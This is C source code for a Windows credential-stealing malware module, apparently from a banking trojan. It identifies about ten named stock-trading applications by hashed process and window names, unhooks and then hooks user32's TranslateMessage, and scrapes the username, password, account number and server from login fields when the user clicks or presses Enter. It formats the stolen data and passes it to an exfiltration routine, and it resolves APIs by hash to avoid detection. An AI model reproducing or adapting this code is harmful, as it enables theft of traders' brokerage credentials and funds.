#include <windows.h>
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Splice.h"
#include "Loader.h"
#include "Utils.h"
#include "Unhook.h"

typedef struct
{
	char *Username;
	char *Password;
	char *UserID;
	char *Server;
	DWORD dwPort;

	DWORD dwUserID;
	DWORD dwPassID;
	DWORD dwServID;
	DWORD dwAccID;
} TRADEINFO, *PTRADEINFO;

PTRADEINFO pTradeInfo;

char *GetCurrentWindow()
{
	char *String = (char*)MemAlloc( 512 );

	if ( String != NULL )
	{
		if ( !(BOOL)pGetWindowTextA( (HWND)pGetActiveWindow(), String, 512 ) )
		{
			if ( !(BOOL)pGetWindowTextA( (HWND)pGetForegroundWindow(), String, 512 ) )
			{
				MemFree( String );
				return NULL;
			}
		}		
	}
	
	return String;
}

DWORD GetCurrentWindowHash()
{
	char *CurrentWindow = GetCurrentWindow();

	DWORD dwHash = -1;

	if ( CurrentWindow != NULL )
	{
		dwHash = CalcHash( CurrentWindow );
		MemFree( CurrentWindow );
	}

	return dwHash;
}

DWORD TradeGetWindowID( HWND hWnd )
{
	return (DWORD)pGetWindowLongPtrA( hWnd, GWL_ID );
}

DWORD TradeGetWindowID2( HWND hWnd )
{
	return (DWORD)pGetWindowLongPtrA( hWnd, GWL_STYLE ) + (DWORD)pGetWindowLongPtrA( hWnd, GWL_EXSTYLE );
}

bool IsBlackwoodPro()
{
	if ( GetProcessHash() == 0xF449D83 && GetCurrentWindowHash() == 0xCDF9F4EA )
	{
		return true;
	}

	return false;
}


bool IsFinamDirect()
{
	if ( GetProcessHash() == 0xCA3DD584 && GetCurrentWindowHash() == 0x4D09F1D7 )
	{
		return true;
	}

	return false;
}


bool IsGrayBox()
{
	if ( GetProcessHash() == 0xE42AEEE3 && GetCurrentWindowHash() == 0x981588C9 )
	{
		return true;
	}

	return false;
}


bool IsMbtPro()
{
	if ( GetProcessHash() == 0x92E8E2C4 && GetCurrentWindowHash() == 0x14B222F7 )
	{
		return true;
	}

	return false;
}


bool IsMbt()
{
	if ( GetProcessHash() == 0x8730C75C && GetCurrentWindowHash() == 0x571F4532 )
	{
		return true;
	}

	return false;
}


bool IsLaser()
{
	if ( GetProcessHash() == 0x571AEF70 && GetCurrentWindowHash() == 0xCDF9F4EA )
	{
		return true;
	}

	return false;
}


bool IsLightSpeed()
{
	if ( GetProcessHash() == 0x50A41172 && GetCurrentWindowHash() == 0xEF3AA28D )
	{
		return true;
	}

	return false;
}


bool IsLT()
{
	if ( GetProcessHash() == 0xCA3DD584 && GetCurrentWindowHash() == 0xE2F553C7 )
	{
		return true;
	}

	return false;
}



bool IsScotTrader()
{
	if ( GetProcessHash() == 0xC9271273 && GetCurrentWindowHash() == 0x7DE8B33F )
	{
		return true;
	}

	return false;
}


bool IsSaxoTrader()
{
	if ( GetProcessHash() == 0x97AEF08C && GetCurrentWindowHash() == 0xFCE82688 )
	{
		return true;
	}

	return false;
}


bool IsQuoteTrader()
{
	if ( GetProcessHash() == 0xC106F303 && GetCurrentWindowHash() == 0xFF5F7E30 )
	{
		return true;
	}

	return false;
}


//hooks
typedef BOOL ( WINAPI *PTranslateMessage )( const MSG *lpMsg );
PTranslateMessage Real_TranslateMessage;

BOOL CALLBACK EnumWindowsProc2( HWND hWnd, LPARAM lParam )
{
	if ( TradeGetWindowID2( hWnd ) == pTradeInfo->dwUserID && pTradeInfo->dwUserID && !pTradeInfo->Username )
	{
		if ( ( pTradeInfo->Username = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Username, 100 );
		}
	}
	else if ( TradeGetWindowID2( hWnd ) == pTradeInfo->dwPassID && pTradeInfo->dwPassID && !pTradeInfo->Password )
	{
		if ( ( pTradeInfo->Password = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Password, 100 );
		}
	}
	else if ( TradeGetWindowID2( hWnd ) == pTradeInfo->dwServID && pTradeInfo->dwServID && !pTradeInfo->Server )
	{
		
		if ( ( pTradeInfo->Server = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Server, 100 );
		}
	}
	else if ( TradeGetWindowID2( hWnd ) == pTradeInfo->dwAccID && pTradeInfo->dwAccID && !pTradeInfo->UserID )
	{
		if ( ( pTradeInfo->UserID = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->UserID, 100 );
		}
	}

	return TRUE;
}


BOOL CALLBACK EnumWindowsProc( HWND hWnd, LPARAM lParam )
{
	if ( TradeGetWindowID( hWnd ) == pTradeInfo->dwUserID && pTradeInfo->dwUserID && !pTradeInfo->Username )
	{
		if ( ( pTradeInfo->Username = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Username, 100 );
		}
	}
	else if ( TradeGetWindowID( hWnd ) == pTradeInfo->dwPassID && pTradeInfo->dwPassID && !pTradeInfo->Password )
	{
		if ( ( pTradeInfo->Password = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Password, 100 );
		}
	}
	else if ( TradeGetWindowID( hWnd ) == pTradeInfo->dwServID && pTradeInfo->dwServID && !pTradeInfo->Server )
	{
		if ( ( pTradeInfo->Server = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Server, 100 );
		}
	}
	else if ( TradeGetWindowID( hWnd ) == pTradeInfo->dwAccID && pTradeInfo->dwAccID && !pTradeInfo->UserID )
	{
		if ( ( pTradeInfo->UserID = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->UserID, 100 );
		}
	}

	return TRUE;
}

void ParseTrade( HWND hWnd )
{
	char *Program = NULL;

	if ( !pTradeInfo )
	{
		return;
	}

	if ( IsBlackwoodPro() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 1022;
		pTradeInfo->dwPassID = 1023;
		pTradeInfo->dwServID = 1687;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		while ( !(BOOL)pEnumChildWindows( (HWND)pGetParent( (HWND)pGetActiveWindow() ), (WNDENUMPROC)EnumWindowsProc, NULL ) );

		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) ||
			 !m_lstrlen( pTradeInfo->Server ) )
		{
			return;
		}

		Program = "BlackwoodPRO";

	}
	else if ( IsFinamDirect() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 5328;
		pTradeInfo->dwPassID = 5329;
		pTradeInfo->dwServID = 159;
		pTradeInfo->dwAccID	 = 5965;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) ||
			 !m_lstrlen( pTradeInfo->UserID   ) ||
			 !m_lstrlen( pTradeInfo->Server ) )
		{
			return;
		}

		Program = "FinamDirect";
	}
	else if ( IsGrayBox() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 1000;
		pTradeInfo->dwPassID = 1001;
		pTradeInfo->dwServID = 1147;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) ||
			 !m_lstrlen( pTradeInfo->Server ) )
		{
			return;
		}

		Program = "GrayBox";
	}
	else if ( IsMbtPro() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 309;
		pTradeInfo->dwPassID = 310;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) )
		{
			return;
		}

		Program = "MbtPRO";
	}
	else if ( IsLaser() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 1062;
		pTradeInfo->dwPassID = 1064;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) )
		{
			return;
		}

		Program = "Laser";
	}
	else if ( IsLightSpeed() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 10826;
		pTradeInfo->dwPassID = 10825;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) )
		{
			return;
		}

		Program = "LightSpeed";
	}
	else if ( IsLT() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 5328;
		pTradeInfo->dwPassID = 5329;
		pTradeInfo->dwServID = 159;
		pTradeInfo->dwAccID	 = 5965;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) ||
			 !m_lstrlen( pTradeInfo->UserID   ) ||
			 !m_lstrlen( pTradeInfo->Server ) )
		{
			return;
		}

		Program = "LTGroup";
	}
	else if ( IsMbt() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 309;
		pTradeInfo->dwPassID = 310;
		pTradeInfo->dwServID = 311;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		

		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) ||
			 !m_lstrlen( pTradeInfo->Server ) )
		{
			return;
		}

		Program = "Mbt";
	}
	else if ( IsScotTrader() && TradeGetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 1076;
		pTradeInfo->dwPassID = 1005;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) )
		{
			return;
		}

		Program = "ScotTrader";
	}
	else if ( IsSaxoTrader() && TradeGetWindowID2( hWnd ) == 1442918145 )
	{
		pTradeInfo->dwUserID = 1442906816;
		pTradeInfo->dwPassID = 1442906848;

		while ( !(BOOL)pEnumChildWindows( (HWND)pGetActiveWindow(), (WNDENUMPROC)EnumWindowsProc2, NULL ) );
		
		if ( !m_lstrlen( pTradeInfo->Username ) ||
			 !m_lstrlen( pTradeInfo->Password ) )
		{
			return;
		}

		Program = "SaxoTrader";
	}


	if ( Program != NULL )
	{
		char *Buffer = (char*)MemAlloc( 1024 );

		char Template[] = "Program:   %s\r\n"
						  "Username:  %s\r\n"
						  "Password:  %s\r\n"
						  "AccountNO: %s\r\n"
						  "Server:    %s\r\n";

		if ( Buffer != NULL )
		{
			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			_pwsprintfA( Buffer, Template, Program, pTradeInfo->Username, pTradeInfo->Password, pTradeInfo->UserID, pTradeInfo->Server );
			
			SendTradeInfo( Buffer );
			MemFree( Buffer );

			MemFree( pTradeInfo->Server );
			MemFree( pTradeInfo->Username );
			MemFree( pTradeInfo->Password );
			MemFree( pTradeInfo->UserID   );

			if ( ( pTradeInfo = (PTRADEINFO)MemAlloc( sizeof( PTRADEINFO ) ) ) != NULL )
			{
				m_memset( pTradeInfo, 0, sizeof( PTRADEINFO ) );
			}		
			
		}
	}


	return;
}

BOOL WINAPI Hook_TranslateMessage( const MSG *lpMsg )
{
	if ( lpMsg->message == WM_LBUTTONDOWN || lpMsg->wParam == 13 )
	{
		ParseTrade( lpMsg->hwnd );
	}

	return Real_TranslateMessage ( lpMsg );
}

void HookTrade()
{
	UnhookUser32();

	if ( ( pTradeInfo = (PTRADEINFO)MemAlloc( sizeof( PTRADEINFO ) ) ) == NULL )
	{
		return;
	}

	m_memset( pTradeInfo, 0, sizeof( PTRADEINFO ) );

	const DWORD HASH_TranslateMessage = 0xC45D9631;
	if ( HookApi( DLL_USER32, HASH_TranslateMessage, &Hook_TranslateMessage ) )
	{
		__asm mov [Real_TranslateMessage], eax
	}

	return;
}


bool IsTrade()
{
	DWORD dwProcessHash = GetProcessHash();

	if ( dwProcessHash == 0xF449D83  ||  //tradeprogram.exe
		 dwProcessHash == 0xCA3DD584 ||  //tradsdfsdfeprogram.exe
		 dwProcessHash == 0xE42AEEE3 ||  //sfsdfsdfdsf.exe
		 dwProcessHash == 0x92E8E2C4 ||
		 dwProcessHash == 0x8730C75C ||
		 dwProcessHash == 0x571AEF70 ||
		 dwProcessHash == 0x50A41172 ||
		 dwProcessHash == 0xCA3DD584 ||
		 dwProcessHash == 0xC9271273 ||
		 dwProcessHash == 0x97AEF08C )
	{
		HookTrade();
		return true;
	}

	return false;
}

bool IsLLLL()
{
	DWORD dwProcessHash = GetProcessHash();

	if ( dwProcessHash == 0xF449D83  ||  //tradeprogram.exe
		 dwProcessHash == 0xCA3DD584 ||  //tradsdfsdfeprogram.exe
		 dwProcessHash == 0xE42AEEE3 ||  //sfsdfsdfdsf.exe
		 dwProcessHash == 0x92E8E2C4 ||
		 dwProcessHash == 0x8730C75C ||
		 dwProcessHash == 0x571AEF70 ||
		 dwProcessHash == 0x50A41172 ||
		 dwProcessHash == 0xCA3DD584 ||
		 dwProcessHash == 0xC9271273 ||
		 dwProcessHash == 0x97AEF08C )
	{
		HookTrade();
		return true;
	}

	return false;
}